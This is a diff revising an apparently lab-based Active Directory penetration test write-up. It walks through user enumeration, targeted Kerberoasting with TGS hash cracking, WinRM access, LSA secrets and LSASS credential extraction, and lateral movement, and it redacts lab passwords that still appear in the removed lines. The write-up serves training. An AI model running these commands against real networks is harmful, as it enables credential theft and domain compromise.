@@ -1054,24 +1054,19 @@ Password: [REDACTED]
 
 I started by identifying the available hosts and enumerating their exposed services.
 
-Nmap identified three Windows Server 2022 machines:
+Nmap identified three Windows Server 2022 hosts within the \`LAINOSCP.local\` domain. The scans revealed the following exposed TCP services and SMB signing configurations:
 
-### Network Discovery
-
-I started by identifying the available hosts and enumerating their exposed services.
-
-Nmap identified three Windows Server 2022 hosts within the `LAINOSCP.local` domain. The scans revealed the following exposed TCP services and SMB signing configurations:
-
-\`\`\`text
 | Host | Role | Open TCP Ports | SMB Signing |
 |---|---|---|---|
 | DC01 | Domain Controller | 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985 | Enabled and required |
 | FORENSICS01 | Forensics Server | 135, 139, 445, 3389, 5985 | Enabled, not required |
 | WS01 | Domain Workstation | 135, 139, 445, 3389, 5985 | Enabled, not required |
-\`\`\`
+
 The Domain Controller exposed additional services associated with Active Directory, including DNS (53), Kerberos (88), LDAP (389) and the Global Catalog (3268). All three hosts exposed SMB (445), RDP (3389) and WinRM (5985), providing potential avenues for authenticated administration and further enumeration.
 
-Although SMB signing was enabled on all three systems, it was not required on FORENSICS01 and WS01. This configuration was recorded for further assessment; by itself, it does not establish that an SMB relay attack is viable.
+Although SMB signing was enabled on all three systems, it was not required on FORENSICS01 and WS01. I recorded this configuration for further assessment; however, it does not independently establish that SMB relay is viable.
+
+![Initial Nmap enumeration](assets/writeups/forensics/image1.png)
 
 ### SMB Enumeration
 
@@ -1091,26 +1086,11 @@ I continued by enumerating domain users through SMB.
 
 \`\`\`bash
 nxc smb ip.txt -u shannon -p '<REDACTED>' --users-export users.txt
-SMB         10.1.143.102    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:LAINOSCP.local) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.1.177.86     445    WS01             [*] Windows Server 2022 Build 20348 x64 (name:WS01) (domain:LAINOSCP.local) (signing:True) (SMBv1:None)
-SMB         10.1.180.183    445    FORENSICS01      [*] Windows Server 2022 Build 20348 x64 (name:FORENSICS01) (domain:LAINOSCP.local) (signing:True) (SMBv1:None)
-SMB         10.1.143.102    445    DC01             [+] LAINOSCP.local\shannon:GoldSeagull123 
-SMB         10.1.177.86     445    WS01             [+] LAINOSCP.local\shannon:GoldSeagull123 
-SMB         10.1.143.102    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
-SMB         10.1.143.102    445    DC01             Administrator                 2026-05-25 04:37:25 0       Built-in account for administering the computer/domain 
-SMB         10.1.180.183    445    FORENSICS01      [+] LAINOSCP.local\shannon:GoldSeagull123 
-SMB         10.1.143.102    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
-SMB         10.1.143.102    445    DC01             krbtgt                        2026-05-25 04:10:08 0       Key Distribution Center Service Account 
-SMB         10.1.143.102    445    DC01             shannon                       2026-05-25 04:40:46 0        
-SMB         10.1.143.102    445    DC01             lion                          2026-05-25 04:41:30 0        
-SMB         10.1.143.102    445    DC01             kanon                         2026-05-25 04:42:20 0        
-SMB         10.1.143.102    445    DC01             erika                         2026-05-25 04:43:36 0        
-SMB         10.1.143.102    445    DC01             [*] Enumerated 7 local users: LAINOSCP
-SMB         10.1.143.102    445    DC01             [*] Writing 7 local users to users.txt
-Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 \`\`\`
 
-The enumeration returned the following accounts:
+The output identified three Windows Server 2022 hosts and confirmed that the supplied credentials were valid.
+
+The following domain accounts were returned:
 
 \`\`\`text
 Administrator
@@ -1124,18 +1104,22 @@ erika
 
 I saved the discovered usernames for subsequent enumeration.
 
+![Domain user enumeration](assets/writeups/forensics/image2.png)
+
 ## BloodHound Analysis
 
 Next, I used RustHound to collect Active Directory information and ingest the resulting data into BloodHound.
 
 This provided a clearer picture of the domain structure, user relationships and potential attack paths.
 
-![BloodHound analysis](assets/writeups/forensics/rusthound.png)
+![RustHound collection](assets/writeups/forensics/image3.png)
+
+![BloodHound analysis](assets/writeups/forensics/image4.png)
 
 ## Initial Access — Targeted Kerberoasting
 
 During further enumeration, I investigated the possibility of Kerberoasting domain accounts.
-![BloodHound analysis](assets/writeups/forensics/bloodhound.png)
+
 I used TargetedKerberoast to identify accounts that could be targeted through SPN manipulation.
 
 \`\`\`bash
@@ -1147,8 +1131,8 @@ python3 targetedKerberoast.py -v \\
 \`\`\`
 
 The tool successfully added an SPN to the account \`lion\` and retrieved a Kerberos TGS hash.
+
 \`\`\`text
-─# python3 targetedKerberoast.py -v -d "LAINOSCP.local" -u "shannon" -p "GoldSeagull123" --dc-host DC01.LAINOSCP.local
 [*] Starting kerberoast attacks
 [*] Fetching usernames from Active Directory with LDAP
 [VERBOSE] SPN added successfully for (lion)
@@ -1168,31 +1152,27 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 \`\`\`
 
 The password was successfully recovered.
+
 \`\`\`text
-┌──(root㉿kali)-[/home/ping_sniper/hsm/OSCP/forensics]
-└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-Using default input encoding: UTF-8
 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
-Will run 13 OpenMP threads
-Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
-Blink182         (?)     
-1g 0:00:00:00 DONE (2026-11-16 08:46) 10.00g/s 133120p/s 133120c/s 133120C/s sandara..121091
-Use the "--show" option to display all of the cracked passwords reliably
+Blink182         (?)
+1g 0:00:00:00 DONE
 Session completed
 \`\`\`
 
-I then used NetExec to verify the credentials against the available WinRM services.
+I then used NetExec to verify the recovered credentials against the available WinRM services.
+
 \`\`\`text
-lion : Blink182
+lion : [REDACTED]
 \`\`\`
 
 \`\`\`bash
-nxc winrm ip.txt -u lion -p 'Blink182'
+nxc winrm ip.txt -u lion -p '<REDACTED>'
 \`\`\`
 
 The credentials were valid for WinRM on WS01, providing an initial foothold on the workstation.
 
-![WinRM access as lion](assets/writeups/forensics/image3.png)
+![WinRM access as lion](assets/writeups/forensics/image5.png)
 
 ## Credential Discovery — Database1.accdb
 
@@ -1200,7 +1180,7 @@ After obtaining access to WS01, I explored the accessible files and directories.
 
 One particularly interesting discovery was a Microsoft Access database named \`Database1.accdb\`.
 
-![Database1.accdb discovery](assets/writeups/forensics/image4.png)
+![Database1.accdb discovery](assets/writeups/forensics/image6.png)
 
 ### Analysing the Database
 
@@ -1237,7 +1217,7 @@ The database contained two tables:
 
 The tool also identified VBA/macro content within the database, suggesting that additional information could be stored beyond the visible tables.
 
-![Database information](assets/writeups/forensics/image5.png)
+![Database information](assets/writeups/forensics/image7.png)
 
 ### Extracting Credentials
 
@@ -1265,7 +1245,7 @@ More importantly, NetExec identified administrative access on WS01.
 
 This provided a stronger security context on the workstation and allowed me to investigate its locally stored credential material.
 
-![Local administrator access on WS01](assets/writeups/forensics/image6.png)
+![Local administrator access on WS01](assets/writeups/forensics/image8.png)
 
 ### LSA Secrets Enumeration
 
@@ -1275,7 +1255,7 @@ The resulting enumeration exposed cached domain credential material and addition
 
 I redacted the recovered secrets from the output.
 
-![LSA secrets enumeration](assets/writeups/forensics/image7.png)
+![LSA secrets enumeration](assets/writeups/forensics/image9.png)
 
 ### Password Reuse Investigation
 
@@ -1323,7 +1303,7 @@ The analysis revealed a logon session belonging to the local Administrator accou
 
 The extracted credential material was redacted.
 
-![LSASS analysis](assets/writeups/forensics/image8.png)
+![LSASS analysis](assets/writeups/forensics/image10.png)
 
 ### Access to FORENSICS01
 
@@ -1331,7 +1311,7 @@ With the recovered credential material, I established administrative access to F
 
 This represented another significant step in the assessment, as I had moved from the initial workstation foothold to administrative access on the dedicated forensics server.
 
-![Administrator access to FORENSICS01](assets/writeups/forensics/image9.png)
+![Administrator access to FORENSICS01](assets/writeups/forensics/image11.png)
 
 ## Domain-Level Credential Material
 
@@ -1379,7 +1359,7 @@ The final enumeration revealed credential material associated with multiple doma
 
 Sensitive hashes and credential material have been omitted from this write-up.
 
-![Domain credential enumeration](assets/writeups/forensics/image10.png)
+![Domain credential enumeration](assets/writeups/forensics/image12.png)
 
 ## Conclusion
 
